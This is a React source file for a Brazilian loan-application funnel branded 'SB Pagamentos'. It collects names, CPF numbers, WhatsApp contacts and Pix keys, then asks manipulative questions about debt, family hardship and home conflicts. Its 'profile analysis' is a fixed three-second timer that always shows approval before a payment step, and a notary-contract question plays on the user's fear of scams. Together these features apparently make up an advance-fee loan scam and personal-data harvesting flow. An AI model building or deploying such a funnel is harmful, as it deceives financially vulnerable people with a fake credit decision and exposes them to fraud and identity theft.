import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import type { LoanFormData, Step } from './types';
import BasicInfo from './components/steps/BasicInfo';
import LoanDetails from './components/steps/LoanDetails';
import Approval from './components/steps/Approval';
import Payment from './components/steps/Payment';
import QuestionStep from './components/steps/QuestionStep';
import { ShieldCheck } from 'lucide-react';

const App: React.FC = () => {
  const [step, setStep] = useState<Step>('basic-info');
  const [formData, setFormData] = useState<LoanFormData>({
    fullName: '',
    cpf: '',
    whatsapp: '',
    amount: 5000,
    installments: 12,
    pixKey: '',
    loanPurpose: '',
    isNegative: '',
    helpFamily: '',
    incomeDissatisfaction: '',
    stoppedDoingThings: '',
    homeConflicts: '',
    trustAgreement: '',
  });
  const [isAnalyzing, setIsAnalyzing] = useState(false);

  const nextStep = (next: Step) => setStep(next);

  const updateFormData = (data: Partial<LoanFormData>) => {
    setFormData((prev) => ({ ...prev, ...data }));
  };

  const handleLastQuestionSubmit = (data: Partial<LoanFormData>) => {
    updateFormData(data);
    setIsAnalyzing(true);
    setTimeout(() => {
      setIsAnalyzing(false);
      nextStep('approval');
    }, 3000);
  };

  const steps: Record<Step, { title: string; component: React.ReactNode }> = {
    'basic-info': {
      title: 'Informações Básicas',
      component: <BasicInfo onNext={(data) => { updateFormData(data); nextStep('loan-details'); }} initialData={formData} />,
    },
    'loan-details': {
      title: 'Simulação de Empréstimo',
      component: <LoanDetails onNext={(data) => { updateFormData(data); nextStep('q-purpose'); }} onBack={() => nextStep('basic-info')} initialData={formData} />,
    },
    'q-purpose': {
      title: 'Finalidade',
      component: <QuestionStep
        question="Para qual finalidade você usará o valor do empréstimo?"
        fieldName="loanPurpose"
        options={['Quitar dívidas', 'Planejar viagem', 'Investir']}
        onNext={(data) => { updateFormData(data); nextStep('q-negative'); }}
        onBack={() => nextStep('loan-details')}
        currentStep={3}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-job': {
      title: 'Renda e Emprego',
      component: <QuestionStep
        question="Qual sua renda atual?"
        fieldName="isNegative"
        options={['Menos de um salário mínimo', 'Até um Salário Mínimo', 'Acima de um Salário Mínimo']}
        onNext={(data) => { updateFormData(data); nextStep('q-negative'); }}
        onBack={() => nextStep('q-purpose')}
        currentStep={4}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-negative': {
      title: 'Situação do Nome',
      component: <QuestionStep
        question="Seu nome hoje está negativado (nome sujo)?"
        fieldName="isNegative"
        options={['Sim, infelizmente', 'Não, meu nome está em ordem']}
        onNext={(data) => { updateFormData(data); nextStep('q-family'); }}
        onBack={() => nextStep('q-job')}
        currentStep={5}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-family': {
      title: 'Apoio Familiar',
      component: <QuestionStep
        question="Você sente que poderá ajudar sua família e próximos a você se o empréstimo for aprovado?"
        fieldName="helpFamily"
        options={['Sim, é o que mais quero', 'Ajudá-los é meu único objetivo', 'Não, será apenas para uso pessoal']}
        onNext={(data) => { updateFormData(data); nextStep('q-income'); }}
        onBack={() => nextStep('q-negative')}
        currentStep={5}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-income': {
      title: 'Renda Atual',
      component: <QuestionStep
        question="Você está insatisfeito com sua renda atual e sente que a SB Pagamentos vai te ajudar nesse problema?"
        fieldName="incomeDissatisfaction"
        options={['Sim, não dá para pagar as contas', 'Incomodado e insatisfeito', 'Eu poderia estar melhor']}
        onNext={(data) => { updateFormData(data); nextStep('q-sacrifices'); }}
        onBack={() => nextStep('q-family')}
        currentStep={6}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-sacrifices': {
      title: 'Sacrifícios',
      component: <QuestionStep
        question="Já deixou de fazer algo para as pessoas que gosta por conta de dificuldades financeiras?"
        fieldName="stoppedDoingThings"
        options={['Sim, e mais de uma vez', 'É difícil ter dinheiro para fazê-los sorrir']}
        onNext={(data) => { updateFormData(data); nextStep('q-conflicts'); }}
        onBack={() => nextStep('q-income')}
        currentStep={7}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-conflicts': {
      title: 'Conflitos',
      component: <QuestionStep
        question="Você vem tendo conflitos em casa por conta de dinheiro?"
        fieldName="homeConflicts"
        options={['Sim, muitos', 'Já tive e não quero mais']}
        onNext={(data) => { updateFormData(data); nextStep('q-trust'); }}
        onBack={() => nextStep('q-sacrifices')}
        currentStep={8}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'q-trust': {
      title: 'Segurança',
      component: <QuestionStep
        question="Sabendo que existem muitos golpes por aí envolvendo empréstimos, você está de acordo que o contrato seja firmado em cartório para sua proteção?"
        fieldName="trustAgreement"
        options={['Sim, confio na SB Pagamentos', 'Realmente golpes existem e quero me proteger']}
        onNext={handleLastQuestionSubmit}
        onBack={() => nextStep('q-conflicts')}
        currentStep={9}
        totalSteps={10}
        initialData={formData}
      />,
    },
    'approval': {
      title: 'Proposta Aprovada',
      component: <Approval formData={formData} onNext={() => nextStep('payment')} onBack={() => nextStep('q-trust')} />,
    },
    'payment': {
      title: 'Finalização',
      component: <Payment formData={formData} />,
    },
  };

  const stepOrder: Step[] = ['basic-info', 'loan-details', 'q-purpose', 'q-negative', 'q-family', 'q-income', 'q-sacrifices', 'q-conflicts', 'q-trust', 'approval', 'payment'];
  const currentStepIndex = stepOrder.indexOf(step);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center py-8 px-4 font-sans">
      <header className="flex items-center gap-4 mb-12 w-full max-w-md">
        <div className="bg-blue-900 p-4 px-7 rounded-tr-2xl rounded-bl-2xl shadow-xl"></div>
        <div>
          <h1 className="text-2xl font-black text-blue-900 tracking-tighter leading-none">SB PAGAMENTOS</h1>
          <p className="text-[10px] text-blue-700 font-bold uppercase tracking-widest mt-1">Sua Solução Financeira</p>
        </div>
      </header>

      <main className="w-full max-w-md">
        {/* Progress Bar */}
        <div className="mb-8 flex justify-between relative px-2">
          <div className="absolute top-1/2 left-0 w-full h-1 bg-gray-100 -translate-y-1/2 -z-10 rounded-full" />
          <div
            className="absolute top-1/2 left-0 h-1 bg-blue-900 -translate-y-1/2 -z-10 transition-all duration-700 ease-in-out rounded-full"
            style={{ width: `${(currentStepIndex / (stepOrder.length - 1)) * 100}%` }}
          />
          {stepOrder.map((s, idx) => (
            <div
              key={s}
              className={`w-6 h-1 rounded-2xl transition-all duration-500 ${idx <= currentStepIndex ? 'bg-blue-900 scale-125 shadow-sm' : 'bg-gray-200'
                }`}
            />
          ))}
        </div>

        <div className="bg-white rounded-3xl shadow-xl shadow-blue-900/10 overflow-hidden border border-gray-100">
          <div className="bg-blue-900 py-5 px-8 text-center">
            <h2 className="text-white font-bold text-lg tracking-tight">{steps[step].title}</h2>
          </div>

          <div className="p-8">
            <AnimatePresence mode="wait">
              {isAnalyzing ? (
                <motion.div
                  key="analyzing"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 1.05 }}
                  className="py-12 flex flex-col items-center text-center gap-6"
                >
                  <div className="relative">
                    <div className="w-20 h-20 border-4 border-blue-50 border-t-blue-900 rounded-full animate-spin" />
                    <ShieldCheck className="w-8 h-8 text-blue-900 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
                  </div>
                  <div className="space-y-3">
                    <h3 className="text-2xl font-black text-gray-800">Analisando Perfil...</h3>
                    <p className="text-gray-500 text-sm leading-relaxed px-4">
                      Aguarde enquanto nosso sistema verifica sua capacidade de crédito e gera sua proposta oficial.
                    </p>
                  </div>
                </motion.div>
              ) : (
                <motion.div
                  key={step}
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  transition={{ duration: 0.4, ease: "easeOut" }}
                >
                  {steps[step].component}
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </main>

      <footer className="mt-12 text-center text-gray-400 text-[10px] uppercase tracking-widest font-bold">
        <p>&copy; 2026 SB Pagamentos - Correspondente Bancário</p>
        <p className="mt-1 opacity-50">Segurança garantida por criptografia ssl</p>
      </footer>
    </div>
  );
};

export default App;
